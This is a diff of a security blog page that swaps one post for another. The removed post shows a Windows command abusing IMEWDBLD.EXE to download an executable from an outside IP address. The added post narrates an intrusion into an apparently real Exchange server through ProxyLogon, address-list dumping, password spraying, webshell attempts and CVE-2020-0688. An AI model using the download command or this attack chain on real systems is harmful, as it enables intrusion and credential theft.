@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Gr3yy">
   <meta name="keywords" content="">
-  <title>利用Imewdbld下载文件 - Gr3yy&#39;s Blog</title>
+  <title>一个exchange小实战 - Gr3yy&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -174,7 +174,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="利用Imewdbld下载文件">
+            <span class="h2" id="subtitle" title="一个exchange小实战">
               
             </span>
 
@@ -184,8 +184,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-05 10:15" pubdate>
-        March 5, 2021 am
+      <time datetime="2021-03-20 05:00" pubdate>
+        March 20, 2021 am
       </time>
     </span>
   
@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      120 字
+      822 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      8
        分钟
     </span>
   
@@ -236,22 +236,42 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">利用Imewdbld下载文件</h1>
+            <h1 style="display: none">一个exchange小实战</h1>
             
             <div class="markdown-body">
-              <h1 id="Using-Imewdbld-to-Download"><a href="#Using-Imewdbld-to-Download" class="headerlink" title="Using Imewdbld to Download"></a>Using Imewdbld to Download</h1><p>一种下载文件的方式</p>
-<p><img src="/img/article2/image-20210305104938086.png" srcset="/img/loading.gif" alt="image-20210305104938086"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://47.75.197.183/ss/Rar.exe<br></code></pre></td></tr></table></figure>
-<p><img src="/img/article2/image-20210305105008540.png" srcset="/img/loading.gif" alt="image-20210305105008540"></p>
-<p>下载目录为</p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>NetCache<span class="hljs-symbol">\&lt;</span>8_RANDOM_ALNUM_CHARS&gt;/&lt;FILENAME&gt;[1].&lt;EXTENSION&gt;<br></code></pre></td></tr></table></figure>
-<p><img src="/img/article2/image-20210305105023927.png" srcset="/img/loading.gif" alt="image-20210305105023927"></p>
-<p>下载后的文件和文件夹是隐藏的，即使开启 “打开隐藏” 也是不会在exploer里面现实的，但是可以使用命令查找路径</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">forfiles /P <span class="hljs-string">&quot;%localappdata%\Microsoft\Windows\INetCache&quot;</span> /S /M * /C <span class="hljs-string">&quot;cmd /c echo </span><br><span class="hljs-string">@path&quot;</span> <br></code></pre></td></tr></table></figure>
-<p><img src="/img/article2/image-20210305105236738.png" srcset="/img/loading.gif" alt="image-20210305105236738"></p>
-<p>或者</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dir /s <span class="hljs-string">&quot;%localappdata%\Microsoft\Windows\INetCache&quot;</span><br></code></pre></td></tr></table></figure>
-<p><img src="/img/article2/image-20210305105301019.png" srcset="/img/loading.gif" alt="image-20210305105301019"></p>
+              <h1 id="一个exchange小实战"><a href="#一个exchange小实战" class="headerlink" title="一个exchange小实战"></a>一个exchange小实战</h1><p>这个目标打的有点意思，记录一下</p>
+<h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>信息收集以后发现目标开了exchange，一看版本，还挺低的。还觉得运气不错，指不定proxyLogon一发入魂。</p>
+<p><img src="/img/article2/image-20210401191331298.png" srcset="/img/loading.gif" alt="image-20210401191331298"></p>
+<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>先测了一手poc，dnslog收到了请求，漏洞存在，内心狂喜。</p>
+<p><img src="/img/article2/image-20210401192029585.png" srcset="/img/loading.gif" alt="image-20210401192029585"></p>
+<p><img src="/img/article2/image-20210401192056920.png" srcset="/img/loading.gif" alt="image-20210401192056920"></p>
+<p>但是后来才发现事情没有那么简单，对方直接给/ecp/proxyLogon.ecp这个接口给删除了…</p>
+<p>估计是因为exchange这种使用量大的服务不好随意关停，很多企业或者厂商更倾向于暴力删改漏洞点而不是升级版本。</p>
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>当下有点头疼，只能先换个思路，尝试从ews去读取邮件信息，看看能不能从邮件里发现些什么</p>
+<p>然后更诡异的事情发生了，读数量的地方没什么问题，可读取邮件itemid的时候，死活不能识别邮箱地址，明明用<code>&lt;t:EmailAddress&gt;&lt;/t:EmailAddress&gt;</code> 标签制定了，怎么试都不行，无奈放弃了这个想法，这个问题至今也没搞懂是为什么。</p>
+<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>邮件也读不到，很难受。于是再换一个思路，去读取GAL（全局地址列表），这次倒是成功的，通过autodiscover接口读到oaburl，然后再通过lzx地址下载lzx，最后通过工具解密，具体步骤见前面的文章。</p>
+<p><img src="/img/article2/image-20210401192949824.png" srcset="/img/loading.gif" alt="image-20210401192949824"></p>
+<p> 导出来三千个邮箱账户，就想着说不定爆破进去一个呢，0688直接起飞。于是用ebruster喷了两天，因为担心用户锁定，一天只敢喷三次，从未中奖的我结果当然也没成功。</p>
+<h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>就在我已经快要放弃这个点的时候，因为实在是不甘心就又看了看ews的返回包，突然发现了华点</p>
+<p><img src="/img/article2/image-20210401193347266.png" srcset="/img/loading.gif" alt="image-20210401193347266"></p>
+<p>这里显示了一个和之前两台长得完全不一样的机器名，于是我就顺手尝试了一下他</p>
+<p><img src="/img/article2/image-20210401193423797.png" srcset="/img/loading.gif" alt="image-20210401193423797"></p>
+<p>！！！！他居然没有删掉ecp的接口！！！，内心狂喜，感觉上天眷顾了我这个努力的打工人</p>
+<h2 id="一波三折"><a href="#一波三折" class="headerlink" title="一波三折"></a>一波三折</h2><p>但是这台机器在外网是访问不到的，直接写webshell肯定不行，于是我想着通过unc路径，把webshell写到外面能访问的机器上。</p>
+<p><code>\\\x.x.local\c$\Program File\exchange\xxx\v15\http\owa\auth\1.aspx</code></p>
+<p>然而事实又和我开起玩笑，对方把<code>DDI</code> 类给禁掉了。</p>
+<p><img src="/img/article2/image-20210401193903734.png" srcset="/img/loading.gif" alt="image-20210401193903734"></p>
+<p>当场人就傻了，这啥机器啊，也太灵性了。</p>
+<h2 id="有志者，事竟成"><a href="#有志者，事竟成" class="headerlink" title="有志者，事竟成"></a>有志者，事竟成</h2><p>就在我又一次陷入自闭的时候，我突然想到了他之前的版本号。15.08，这个版本应该连cve-2020-0688也没修掉。而0688的利用条件是有一个普通用户的凭证。虽然我没有用户的凭证，但是我有proxyLogon呀！！！！</p>
+<p>通过proxyLogon我可以直接拿到asp.net_session。</p>
+<p>说干就干，首先通过/ecp/proxyLogon.ecp接口通过ecp的认证，获得.net的session。</p>
+<p><img src="/img/article2/image-20210401194405162.png" srcset="/img/loading.gif" alt="image-20210401194405162"></p>
+<p>然后通过这个session直接生成0688的payload（前提是<code>generator</code> 的值是默认值），然后通过ssrf直接梭哈。</p>
+<p><img src="/img/article2/image-20210401194714081.png" srcset="/img/loading.gif" alt="image-20210401194714081"></p>
+<p><img src="/img/article2/image-20210401195145084.png" srcset="/img/loading.gif" alt="image-20210401195145084"></p>
+<p>好家伙，收到请求的时候眼泪都要流出来了。</p>
+<p>后面的操作就很常规了，没啥好说的。</p>
+<p>这个故事就是 告诉大家不要轻言放弃。</p>
 
             </div>
             <hr>
@@ -269,9 +289,11 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/">后渗透</a>
+                      <a class="hover-with-bg" href="/tags/AD/">AD</a>
                     
-                      <a class="hover-with-bg" href="/tags/Tool/">Tool</a>
+                      <a class="hover-with-bg" href="/tags/Exchange/">Exchange</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Real/">Real</a>
                     
                   </div>
                 
@@ -284,9 +306,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/03/20/%E4%B8%80%E4%B8%AAexch%E5%B0%8F%E5%AE%9E%E6%88%98/">
+                      <a href="/2021/03/20/exchange_ssrf/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一个exchange小实战</span>
+                        <span class="hidden-mobile">CVE-2021–26855 & CVE-2021–27065（ProxyLogon）分析</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -294,8 +316,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/02/TSCE/">
-                        <span class="hidden-mobile">浪潮clusterengine 未授权RCE</span>
+                      <a href="/2021/03/05/imewdbld/">
+                        <span class="hidden-mobile">利用Imewdbld下载文件</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
